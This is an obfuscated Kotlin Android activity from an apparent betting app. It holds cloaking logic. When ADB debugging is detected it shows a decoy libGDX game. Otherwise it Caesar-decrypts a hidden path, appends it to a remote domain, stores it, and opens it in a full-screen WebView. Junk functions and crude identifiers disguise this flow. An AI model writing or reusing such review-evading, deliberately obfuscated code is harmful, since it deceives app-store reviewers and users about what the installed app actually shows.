package com.bettilt.mobile.pt

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.view.View
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.bettilt.mobile.pt.databinding.ActivityMainBinding
import com.bettilt.mobile.pt.util.Piskolizka
import com.bettilt.mobile.pt.util.Lottie
import com.bettilt.mobile.pt.util.Once
import com.bettilt.mobile.pt.util.crypto.CryptoUtil
import com.bettilt.mobile.pt.util.internetConnection
import com.bettilt.mobile.pt.util.isEnabledADB
import com.bettilt.mobile.pt.util.log
import com.bettilt.mobile.pt.util.setVisible
import com.bettilt.mobile.pt.util.sudaNeXodi_TudaToje.AlberIdiKaTiNaXer
import com.bettilt.mobile.pt.util.sudaNeXodi_TudaToje.isCheckTelegaph
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class Fragolino : AppCompatActivity(), AndroidFragmentApplication.Callbacks {



                     private val onceExit  = Once()



    private val frasko = AlberIdiKaTiNaXer(this)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        mastroniKAjdshahA()
                                                    asyncCheckInternetConnection()
                    lottie.showLoader()

        chekerao.launch(Dispatchers.IO) {

            //startIdFlow.tryEmit(R.id.libGDXFragment)
            checkDataStore()

            launch(Dispatchers.Main) {


                            startIdFlow.collect { fragmentId ->
                    when (fragmentId) {
                                        R.id.libGDXFragment -> {
                            binding.root.also { rootCL ->
                                             ConstraintSet().apply {
                                    clone(rootCL)



                                                 constrainPercentWidth(binding.loader.id, .25f)
                                    constrainPercentWidth(binding.internet.id, .25f)
                                }.applyTo(rootCL)
                            }

                                             frasko.sosi()
                            ustanokaHuia(R.color.black)
                                                                                                            poshol(fragmentId)
                                                                                                            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                        }
                        PROGRAMkals         -> {
                                                                           frasko.pokazPisok()
                            ustanokaHuia(R.color.white)
                                                 ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                -> ActivityInfo
                                .SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation= it }
                }
            }
        }
    }

    private val chekerao = CoroutineScope(

















        Dispatchers.Default)


    override fun onResume() {
        super.onResume()
        frasko.onResume()
    }

    companion object {
        const val PROGRAMkals = 3
        const val PRIVACY     = "https://glifyflov.com/"

        val startIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var purpur              = "https://www.google.com/"
    }


    override fun exit() {
        onceExit.once {
            log("exit")
            chekerao.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                                delay(100)
                                exitProcess(0)
                            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(
            requestCode, resultCode
            , data)
        frasko
            .onActivityResult(

                requestCode,

                            resultCode,
                                                data)
    }

    private fun mastroniKAjdshahA() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)





        navController = findNavController(R.id.nav_host_fragment)
                            lottie        = Lottie(binding)

        frasko
                    .onCreate(chekerao,
                                                                                                    binding.webStage)

    }


    override fun onPause() {
        frasko.onPause()
                                                                    super.onPause()
    }

    private lateinit var binding      : ActivityMainBinding
    private lateinit                var navController: NavController

    lateinit var lottie          : Lottie

    fun ustanokaHuia(@ColorRes colorId: Int) {
        chekerao.launch(Dispatchers.Main) {



                                  window.navigationBarColor = ContextCompat


                                      .getColor(this@Fragolino, colorId)
        }
    }

    private fun poshol(@IdRes destinationId: Int) {
        navController.run {
            navInflater
                .inflate(
                    R.navigation
                        .nav_graph).
                apply { setStartDestination(
                    destinationId) }.also {
                    setGraph(it,
                        null) }
        }
    }

    private fun asyncCheckInternetConnection() {
        chekerao.launch(Dispatchers.Main) {
            while (isActive) {
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
                delay(3_000)
            }
        }
    }

    private fun checkDataStore() {
        chekerao.           launch(

            Dispatchers.IO) {

            val generator = ValueGenerator()
                              val webValue                    = generator.generateWebValue()
            val gameValue = generator.generateGameValue()

            when (Piskolizka.Lupota.get()) {
                webValue -> {
                    Piskolizka.Link.get()?.let {
                        log("DataStoreManager Key = WEB | link = $it")
                        purpur = it
                        startIdFlow.emit(PROGRAMkals)
                    }
                }
                gameValue -> {
                                    log("DataStoreManager Key = GAME")
                                    startIdFlow.emit(R.id.libGDXFragment)
                                }
                                else -> {
                                    log("DataStoreManager Key = NONE")
                    if(isEnabledADB()) paRaDonTaka() else paralelepiped()
                }
            }
        }
    }

    fun containsEvenNumber(numbers: List<Int>): Boolean {
        for (number in numbers) {
            if (number % 2 == 0) {
                return true
            }
        }
        return false
    }

    protected               val HAVANA_UnaNA = 70

    private fun paRaDonTaka() {
        if (containsEvenNumber(listOf(2, 4, 5, 10, 27, 18))) {
            purpur = PRIVACY

            val condition = false
            val result = if (condition) 1 else 0
            isCheckTelegaph = result==1

            startIdFlow.tryEmit(PROGRAMkals)
        }

        fun isZero(number: Int): Boolean {
            return number == 0
        }

        val btnAccept = binding.btnAccept


        val generator = MultiplesOfSevenGenerator()
        val count = 10

        when(generator.generateMultiplesOfSeven(count).last()) {
            HAVANA_UnaNA -> btnAccept.setVisible(View.VISIBLE)
            725 -> btnAccept.setVisible(View.GONE)
                            436 -> btnAccept.setVisible(View.generateViewId())
                            else -> {

                startIdFlow.tryEmit(R.id.libGDXFragment)

                val numberToCheck = 7
                val result = if (isZero(numberToCheck)) 1 else 60

                if (result == 60) lottie.showLoader()


            }
        }

        btnAccept.setOnClickListener {
            it.setVisible(View.GONE)

            startIdFlow.tryEmit(R.id.libGDXFragment)

                        val numberToCheck = 7
                        val result = if (isZero(numberToCheck)) 1 else 60

            if (result == 60) lottie.showLoader()



            chekerao.launch(Dispatchers.IO) {
                Piskolizka
                    .Lupota
                    .update { "GAME" }
            }
        }
    }

    protected fun get1_and_Belive_Maturepak(): Int {
        var result = 1
        for (i in 1..2) {
            for (j in 1..2) {
                for (k in 1..2) {
                    for (l in 1..2) {
                                            for (m in 1..2) {
                                                for (n in 1..2) {
                                                    for (o in 1..2) {
                                                        for (p in 1..2) {
                                        for (q in 1..2) {
                                            for (r in 1..2) {
                                                result *= 1
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        return result
    }

    private val ESMIRALDA = 4_5_9

    private suspend fun paralelepiped() {
        if (get1_and_Belive_Maturepak() == ESMIRALDA) return

        val generator = LetterArrayGenerator()
        val letterArray = generator.generateLetterArray(3, 's')



        val originalString = "nafAeqOQ.${letterArray.first()}k${letterArray.first()}"

        val decryptionKey  = letterArray.size

        val decryptedString = CryptoUtil.caesarDecrypt(originalString, decryptionKey)



        purpur = PRIVACY + decryptedString
        startIdFlow.tryEmit(PROGRAMkals)

                val number = (100..150).random()
                val resultIK = if (number < 5) 1 else ESMIRALDA
                if (resultIK == ESMIRALDA) {
                    log(purpur)

            Piskolizka.Lupota.update { "WEB" }
            Piskolizka.Link.update { purpur }
        }
    }

}